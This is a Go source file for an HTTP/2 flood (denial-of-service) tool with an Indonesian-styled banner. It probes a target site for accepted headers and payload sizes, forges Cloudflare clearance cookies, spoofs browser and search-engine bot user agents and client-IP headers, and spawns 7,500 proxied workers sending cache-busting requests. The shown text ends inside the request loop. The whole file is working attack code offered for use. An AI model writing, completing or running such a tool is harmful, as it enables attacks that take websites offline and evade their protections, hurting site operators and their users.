package main

import (
	"bufio"
	"context"
	"crypto/tls"
	cryptorand "crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/net/http2"
)

const (
	HAPUS  = "\033[0m"
	MERAH  = "\033[31m"
	IJO    = "\033[32m"
	PUTIH  = "\033[37m"
	CANDY  = "\033[91m"
	PUCAT  = "\033[38;5;203m"
	PUNYAMU = "\033[38;5;204m"
	PUNYA_LU_PUCAT = "\033[38;5;218m"
	MASA_DEPAN_NYA = "\033[97m"
)

const (
	WORKER_COUNT = 7500
	TIMEOUT      = 6 * time.Second
	KEEP_ALIVE   = 30 * time.Second
)

type BPF struct {
	UA           string
	Accept       string
	Lang         string
	Encoding     string
	SecChUa      string
	SecChUaMov   string
	SecChUaPlat  string
	SecFetchSite string
	SecFetchMode string
	SecFetchDest string
	Referer      string
	Origin       string
	DNT          string
}

var PFS = []BPF{
	{
		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="144", "Google Chrome";v="144", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?0",
		SecChUaPlat:  "Windows",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "https://www.google.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="143", "Google Chrome";v="143", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?0",
		SecChUaPlat:  "macOS",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "https://www.google.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="146", "Google Chrome";v="146", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?1",
		SecChUaPlat:  "Android",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "https://www.google.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      "",
		SecChUaMov:   "",
		SecChUaPlat:  "",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "",
		DNT:          "1",
	},
	{
		UA:           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      "",
		SecChUaMov:   "",
		SecChUaPlat:  "",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "",
		DNT:          "1",
	},
	{
		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="145", "Microsoft Edge";v="145", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?0",
		SecChUaPlat:  "Windows",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.bing.com/search?q=",
		Origin:       "https://www.bing.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/130.0.0.0",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="144", "Opera";v="130", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?0",
		SecChUaPlat:  "Windows",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "https://www.google.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      "",
		SecChUaMov:   "",
		SecChUaPlat:  "",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      "",
		SecChUaMov:   "",
		SecChUaPlat:  "",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "",
		DNT:          "",
	},
}

var (
	maxPayloadSize     int
	maxHeaderSize      int
	bypassSupport      map[string]bool
	httpVersion        string
	validOrigins       []string
	validUserAgents    []string
	validReferers      []string
	validMethods       []string
	validEncodings     []string
	validCacheControls []string
)

var cacheParams = []string{"_", "cb", "rnd", "ts", "cache", "v", "ver", "t", "q", "s", "page", "id", "rand", "random"}
var cookieNames = []string{"session", "__cfduid", "_ga", "_gid", "visitor", "token", "cf_clearance", "__cf_bm"}
var botUAs = []string{
	"Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.2; +https://openai.com/gptbot)",
	"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
	"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
	"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
	"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
	"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
}

var globalCookie string

func randIP(rng *rand.Rand) string {
	return fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
}

func randStr(rng *rand.Rand, n int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = chars[rng.Intn(len(chars))]
	}
	return string(b)
}

func randHex(n int) string {
	b := make([]byte, n)
	if _, err := cryptorand.Read(b); err != nil {
		return randStr(rand.New(rand.NewSource(time.Now().UnixNano())), n*2)[:n]
	}
	return hex.EncodeToString(b)[:n]
}

func generateBypassCookie() string {
	ts := time.Now().Unix()
	return fmt.Sprintf("cf_clearance=%s_%d-1.2.1.1-%s", randHex(22), ts, randHex(6))
}

func probeMaxPayload(target string) int {
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	sizes := []int{64, 128, 256, 512, 1024, 2048, 4096, 8192}
	best := 0
	for _, sz := range sizes {
		u := target
		if strings.Contains(u, "?") {
			u += "&big=" + strings.Repeat("x", sz)
		} else {
			u += "?big=" + strings.Repeat("x", sz)
		}
		req, _ := http.NewRequest("GET", u, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		resp, err := client.Do(req)
		if err != nil {
			break
		}
		resp.Body.Close()
		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
			best = sz
		} else if resp.StatusCode == http.StatusBadRequest || resp.StatusCode == http.StatusRequestURITooLong || resp.StatusCode == 413 {
			break
		} else {
			break
		}
	}
	return best
}

func probeMaxHeader(target string) int {
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	sizes := []int{512, 1024, 2048, 4096, 8192, 16384}
	best := 0
	for _, sz := range sizes {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set("X-Large-Data", strings.Repeat("x", sz))
		resp, err := client.Do(req)
		if err != nil {
			break
		}
		resp.Body.Close()
		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
			best = sz
		} else if resp.StatusCode == http.StatusBadRequest || resp.StatusCode == 413 || resp.StatusCode == 431 {
			break
		} else {
			break
		}
	}
	return best
}

func probeHeaderBypass(target, proxyIP string) map[string]bool {
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	parsed, _ := url.Parse(target)
	host := parsed.Hostname()
	if proxyIP == "" {
		rng := rand.New(rand.NewSource(time.Now().UnixNano()))
		proxyIP = randIP(rng)
	}
	headers := []string{
		"X-Original-URL",
		"X-Forwarded-Host",
		"X-Request-ID",
		"CDN-Loop",
		"CF-Connecting-IP",
		"True-Client-IP",
	}
	result := make(map[string]bool)
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	for _, h := range headers {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		switch h {
		case "X-Original-URL":
			req.Header.Set("X-Original-URL", "/"+randStr(rng, 8))
		case "X-Forwarded-Host":
			req.Header.Set("X-Forwarded-Host", host)
		case "X-Request-ID":
			req.Header.Set("X-Request-ID", strconv.FormatInt(rng.Int63(), 16))
		case "CDN-Loop":
			req.Header.Set("CDN-Loop", "cloudflare")
		case "CF-Connecting-IP":
			req.Header.Set("CF-Connecting-IP", proxyIP)
		case "True-Client-IP":
			req.Header.Set("True-Client-IP", proxyIP)
		}
		resp, err := client.Do(req)
		if err != nil {
			result[h] = false
			continue
		}
		resp.Body.Close()
		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
			result[h] = true
		} else {
			result[h] = false
		}
	}
	return result
}

func probeHTTPVersion(target string) string {
	parsed, _ := url.Parse(target)
	host := parsed.Hostname()
	conn, err := tls.Dial("tcp", net.JoinHostPort(host, "443"), &tls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{"h2", "http/1.1"},
	})
	if err != nil {
		return "unknown"
	}
	defer conn.Close()
	proto := conn.ConnectionState().NegotiatedProtocol
	if proto == "h2" {
		return "H2"
	} else if proto == "http/1.1" {
		return "H1"
	}
	return "H3"
}

func probeOrigins(target string) []string {
	parsed, _ := url.Parse(target)
	host := parsed.Hostname()
	candidates := []string{
		"https://" + host,
		"https://www.google.com",
		"https://www.bing.com",
		"https://www.yahoo.com",
		"",
	}
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	var valid []string
	for _, o := range candidates {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		if o != "" {
			req.Header.Set("Origin", o)
		}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, o)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, "https://"+host)
	}
	return valid
}

func probeUserAgents(target string) []string {
	testUAs := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
	}
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	var valid []string
	for _, ua := range testUAs {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", ua)
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, ua)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, testUAs[0])
	}
	return valid
}

func probeReferers(target string) []string {
	parsed, _ := url.Parse(target)
	host := parsed.Hostname()
	candidates := []string{
		"https://" + host + "/",
		"https://www.google.com/search?q=" + host,
		"https://www.bing.com/search?q=" + host,
		"https://www.yahoo.com/search?p=" + host,
		"",
	}
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	var valid []string
	for _, r := range candidates {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		if r != "" {
			req.Header.Set("Referer", r)
		}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, r)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, "https://"+host+"/")
	}
	return valid
}

func probeMethods(target string) []string {
	methods := []string{"GET", "POST", "OPTIONS"}
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	var valid []string
	for _, m := range methods {
		var body io.Reader
		if m == "POST" {
			body = strings.NewReader("")
		}
		req, _ := http.NewRequest(m, target, body)
		if m == "POST" {
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		}
		req.Header.Set("User-Agent", "Mozilla/5.0")
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, m)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, "GET")
	}
	return valid
}

func probeEncodings(target string) []string {
	encs := []string{"gzip, deflate, br", "gzip, deflate", "gzip", "br", "identity"}
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	var valid []string
	for _, e := range encs {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set("Accept-Encoding", e)
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, e)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, "gzip, deflate, br")
	}
	return valid
}

func probeCacheControls(target string) []string {
	controls := []string{"no-cache", "no-store", "max-age=0", "must-revalidate"}
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	var valid []string
	for _, c := range controls {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set("Cache-Control", c)
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, c)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, "no-cache")
	}
	return valid
}

func loadCookieFromFile(target string) string {
	parsed, _ := url.Parse(target)
	host := parsed.Hostname()
	fname := strings.ReplaceAll(host, ".", "_") + ".cookie"
	data, err := os.ReadFile(fname)
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(data))
}

func main() {
	if len(os.Args) < 4 {
		fmt.Println("Usage: go run main.go <target> <duration_seconds> <proxyfile>")
		fmt.Println("Example: go run main.go https://target.com 60 proxies.txt")
		os.Exit(1)
	}
	target := os.Args[1]
	duration, _ := strconv.Atoi(os.Args[2])
	proxyFile := os.Args[3]

	var proxies []*url.URL
	file, err := os.Open(proxyFile)
	if err == nil {
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" {
				continue
			}
			if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
				line = "http://" + line
			}
			if p, err := url.Parse(line); err == nil {
				proxies = append(proxies, p)
			}
		}
	}
	if len(proxies) == 0 {
		proxies = append(proxies, nil)
	}

	globalCookie = loadCookieFromFile(target)
	if globalCookie != "" {
		fmt.Printf("[INFO] Loaded cookie from file\n")
	}

	parsedTarget, _ := url.Parse(target)
	host := parsedTarget.Hostname()
	if strings.HasPrefix(host, "www.") {
		host = host[4:]
	}

	proxyIPs := []string{}
	for _, p := range proxies {
		if p != nil {
			proxyIPs = append(proxyIPs, p.Hostname())
		}
	}
	if len(proxyIPs) == 0 {
		proxyIPs = []string{"127.0.0.1", "8.8.8.8", "1.1.1.1", "192.168.1.1", "10.0.0.1"}
	}
	firstProxyIP := ""
	if len(proxyIPs) > 0 {
		firstProxyIP = proxyIPs[0]
	}

	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	var wg sync.WaitGroup
	wg.Add(10)
	probeDone := 0
	var probeMu sync.Mutex
	printProbe := func(name string) {
		probeMu.Lock()
		probeDone++
		done := probeDone
		probeMu.Unlock()
		fmt.Printf("[ Bypassed ] ▶ [ %-10s ] ▶ [ %d%% ]\n", name, (done*100)/10)
	}

	go func() {
		defer wg.Done()
		maxPayloadSize = probeMaxPayload(target)
		printProbe("Payload")
	}()
	go func() {
		defer wg.Done()
		maxHeaderSize = probeMaxHeader(target)
		printProbe("Header")
	}()
	go func() {
		defer wg.Done()
		bypassSupport = probeHeaderBypass(target, firstProxyIP)
		printProbe("Bypass")
	}()
	go func() {
		defer wg.Done()
		httpVersion = probeHTTPVersion(target)
		printProbe("HTTP/2")
	}()
	go func() {
		defer wg.Done()
		validOrigins = probeOrigins(target)
		printProbe("Origin")
	}()
	go func() {
		defer wg.Done()
		validUserAgents = probeUserAgents(target)
		printProbe("UA")
	}()
	go func() {
		defer wg.Done()
		validReferers = probeReferers(target)
		printProbe("Referer")
	}()
	go func() {
		defer wg.Done()
		validMethods = probeMethods(target)
		printProbe("Method")
	}()
	go func() {
		defer wg.Done()
		validEncodings = probeEncodings(target)
		printProbe("Encoding")
	}()
	go func() {
		defer wg.Done()
		validCacheControls = probeCacheControls(target)
		printProbe("Cache")
	}()
	wg.Wait()
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")

	fmt.Printf("%s", MASA_DEPAN_NYA)
	fmt.Println("\n:::::::-.  :::::::::      .,~:::::    .:::.")
	fmt.Printf("%s", PUNYA_LU_PUCAT)
	fmt.Println(" ;;,   `';,'`````;;;    ,;;;'````'   ,;'``;.")
	fmt.Printf("%s", PUNYAMU)
	fmt.Println(" `[[     [[    .n[['    [[[          ''  ,['")
	fmt.Printf("%s", PUCAT)
	fmt.Println("  $$,    $$  ,$$P\" cccc $$$          .c$$P'")
	fmt.Printf("%s", MERAH)
	fmt.Println("  888_,o8P',888bo,_     `88bo,__,o, d88 _,oo,")
	fmt.Printf("%s", CANDY)
	fmt.Println("  MMMMP\"`   `\"\"*UMM       \"YUMMMMMP\"MMMUP*\"^^")
	fmt.Printf("%s", HAPUS)
	fmt.Printf("%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", MERAH, HAPUS)

	printInfo := func(label, value, status string) {
		if status != "" {
			fmt.Printf("%s〇%s %s%s%s %s:%s %s%s%s %s[%s%s%s]\n",
				IJO, HAPUS,
				PUTIH, label, HAPUS,
				MERAH, HAPUS,
				PUTIH, value, HAPUS,
				MERAH, IJO, status, MERAH,
			)
		} else {
			fmt.Printf("%s〇%s %s%s%s %s:%s %s%s%s\n",
				IJO, HAPUS,
				PUTIH, label, HAPUS,
				MERAH, HAPUS,
				PUTIH, value, HAPUS)
		}
	}

	printInfo("Author", "Diz Flyze Ofc              ", "True")
	printInfo("Target", host, "")
	printInfo("Port  ", "443                        ", "True")
	printInfo("Method", "H2-FLOW                    ", "True")
	printInfo("Proxy ", fmt.Sprintf("%d                        ", len(proxies)), "True")
	printInfo("Worker", fmt.Sprintf("%d                       ", WORKER_COUNT), "True")
	printInfo("HTTP  ", fmt.Sprintf("%-24s   ", httpVersion), "True")
	if globalCookie != "" {
		fmt.Printf("%s〇%s %sCookie%s %s:%s %s                            [%s%s%s]\n",
			IJO, HAPUS,
			PUTIH, HAPUS,
			MERAH, HAPUS,
			MERAH, IJO, "True", MERAH)
	} else {
		fmt.Printf("%s〇%s %sCookie%s %s:%s %s                            [%s%s%s]\n",
			IJO, HAPUS,
			PUTIH, HAPUS,
			MERAH, HAPUS,
			PUTIH, IJO, "None", PUTIH)
	}
	fmt.Printf("%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", MERAH, HAPUS)

	startTime := time.Now()
	ctx, cancel := context.WithCancel(context.Background())
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				fmt.Printf("\r%*s\r", 80, "")
				return
			case <-ticker.C:
				elapsed := int(time.Since(startTime).Seconds())
				if elapsed > duration && duration > 0 {
					elapsed = duration
				}
				fmt.Printf("\r%s〇%s %sTime  %s %s:%s %s%02d/%ds%s                    %s[%s%s%s]\033[K",
					IJO, HAPUS,
					PUTIH, HAPUS,
					MERAH, HAPUS,
					PUTIH, elapsed, duration, HAPUS,
					MERAH, IJO, "True", MERAH)
			}
		}
	}()
	var wg2 sync.WaitGroup
	if duration > 0 {
		time.AfterFunc(time.Duration(duration)*time.Second, func() {
			cancel()
		})
	}

	type clientWrap struct {
		client *http.Client
		ip     string
	}
	clients := make([]clientWrap, len(proxies))
	for i, proxyURL := range proxies {
		tr := &http.Transport{
			DialContext: (&net.Dialer{
				Timeout:   4 * time.Second,
				KeepAlive: KEEP_ALIVE,
			}).DialContext,
			DisableKeepAlives:     false,
			DisableCompression:    false,
			MaxIdleConns:          10000,
			MaxIdleConnsPerHost:   5000,
			MaxConnsPerHost:       0,
			IdleConnTimeout:       KEEP_ALIVE,
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
				MinVersion:         tls.VersionTLS12,
				MaxVersion:         tls.VersionTLS13,
				NextProtos:         []string{"h2", "http/1.1"},
				CipherSuites: []uint16{
					tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
					tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
					tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
					tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
					tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
					tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
				},
			},
			ForceAttemptHTTP2:     true,
			TLSHandshakeTimeout:   4 * time.Second,
			ResponseHeaderTimeout: 4 * time.Second,
			ExpectContinueTimeout: 0 * time.Second,
		}
		_ = http2.ConfigureTransport(tr)
		ip := ""
		if proxyURL != nil {
			tr.Proxy = http.ProxyURL(proxyURL)
			ip = proxyURL.Hostname()
		}
		jar, _ := cookiejar.New(nil)
		clients[i] = clientWrap{
			client: &http.Client{Transport: tr, Timeout: TIMEOUT, Jar: jar},
			ip:     ip,
		}
	}

	type headerItem struct{ key, value string }

	var totalRequests, totalErrors int64

	for w := 0; w < WORKER_COUNT; w++ {
		wg2.Add(1)
		cw := clients[w%len(clients)]
		go func(cli clientWrap, workerID int) {
			defer wg2.Done()
			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))

			for ctx.Err() == nil {
				method := validMethods[rng.Intn(len(validMethods))]
				ua := validUserAgents[rng.Intn(len(validUserAgents))]
				if rng.Intn(10) < 3 && len(botUAs) > 0 {
					ua = botUAs[rng.Intn(len(botUAs))]
				}
				ref := validReferers[rng.Intn(len(validReferers))]
				enc := validEncodings[rng.Intn(len(validEncodings))]
				cacheCtrl := validCacheControls[rng.Intn(len(validCacheControls))]

				forIP := proxyIPs[rng.Intn(len(proxyIPs))]
				realIP := cli.ip
				if realIP == "" {
					realIP = forIP
				}

				origin := validOrigins[rng.Intn(len(validOrigins))]
				referer := ref
				if origin != "" {
					for _, r := range validReferers {
						if strings.Contains(r, host) || strings.Contains(r, "google") || strings.Contains(r, "bing") {
							referer = r
							break
						}
					}
				}
				secFetchSite := "cross-site"
				if strings.Contains(origin, host) {
					secFetchSite = "same-origin"
				}

				prof := PFS[rng.Intn(len(PFS))]

				params := []string{}
				params = append(params, "_="+strconv.FormatInt(time.Now().UnixNano(), 10))
				for j := 0; j < 1+rng.Intn(3); j++ {
					key := cacheParams[rng.Intn(len(cacheParams))]
					val := strconv.FormatInt(rng.Int63(), 10)
					params = append(params, key+"="+val)
				}
				if maxPayloadSize > 0 && rng.Intn(3) == 0 {
					size := maxPayloadSize/2 + rng.Intn(maxPayloadSize/2)
					if size < 1 {
						size = 64
					}
					params = append(params, "big="+strings.Repeat("x", size))
				}
				if rng.Intn(10) == 0 {
					params = append(params, randStr(rng, 8)+"="+randStr(rng, 12))
				}

				finalURL := target
				if rng.Intn(5) == 0 {
					u, _ := url.Parse(finalURL)
					path := u.Path
					if !strings.HasSuffix(path, "/") {
						path += "/"
					}
					path += randStr(rng, 4) + "/"
					u.Path = path
					finalURL = u.String()
				}
				if strings.Contains(finalURL, "?") {
					finalURL += "&" + strings.Join(params, "&")
				} else {
					finalURL += "?" + strings.Join(params, "&")
				}

				var body io.Reader
				if method == "POST" {
					body = strings.NewReader("")
				}
				req, _ := http.NewRequest(method, finalURL, body)

				headers := []headerItem{}

				if method == "POST" {
					headers = append(headers, headerItem{"Content-Type", "application/x-www-form-urlencoded"})
				}

				headers = append(headers, headerItem{"User-Agent", ua})
				headers = append(headers, headerItem{"Accept-Encoding", enc})
				headers = append(headers, headerItem{"Cache-Control", cacheCtrl})

				if rng.Intn(2) == 0 {
					if rng.Intn(2) == 0 {
						headers = append(headers, headerItem{"Referer", "https://cloudflare.com/"})
					} else {
						headers = append(headers, headerItem{"Referer", "https://" + host + "/"})
					}
				} else if referer != "" {
					headers = append(headers, headerItem{"Referer", referer})
				}
				if origin != "" {
					headers = append(headers, headerItem{"Origin", origin})
				}
				headers = append(headers, headerItem{"Sec-Fetch-Site", secFetchSite})

				headers = append(headers, headerItem{"Accept", prof.Accept})
				headers = append(headers, headerItem{"Accept-Language", prof.Lang})
				headers = append(headers, headerItem{"Connection", "keep-alive"})
				headers = append(headers, headerItem{"Pragma", "no-cache"})
				headers = append(headers, headerItem{"Upgrade-Insecure-Requests", "1"})
				headers = append(headers, headerItem{"If-Modified-Since", time.Now().AddDate(-1, 0, 0).Format(time.RFC1123)})
				headers = append(headers, headerItem{"X-Cache-Buster", strconv.FormatInt(rng.Int63(), 16)})

				if prof.SecChUa != "" {
					headers = append(headers, headerItem{"Sec-Ch-Ua", prof.SecChUa})
					headers = append(headers, headerItem{"Sec-Ch-Ua-Mobile", prof.SecChUaMov})
					headers = append(headers, headerItem{"Sec-Ch-Ua-Platform", prof.SecChUaPlat})
				}
